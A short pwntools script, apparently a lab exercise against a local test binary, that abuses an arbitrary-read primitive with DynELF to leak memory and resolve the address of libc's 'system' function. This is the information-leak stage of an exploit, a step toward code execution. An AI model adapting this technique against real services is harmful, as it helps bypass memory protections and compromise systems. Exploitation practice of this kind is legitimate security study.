from pwnlib import *
from pwn import *
from struct import *
import sys
main = 0x080491a6
#r = tubes.remote.remote('localhost',2048)
e=ELF('./testa_dynelf')
r=e.process()
prompt = r.recvuntil(b'\n',drop=True)
def leak(address):
   sleep(1)
   print("leaking " + hex(address))
   r.sendline(format(address,'x').encode('utf-8'))
   try:
      value = r.recvn(4)
      print(f"{value}")
      #print("returning "+hex(ord(value[0]))+hex(ord(value[1]))+hex(ord(value[2]))+hex(ord(value[3])))
      #print("returning "+str(value))
      return value
   except:
      return None
  
d = dynelf.DynELF(leak,main,elf=e)
#print d.lookup(None, 'libc')
print(f"system @ {hex(d.lookup('system','libc'))}")
r.close()
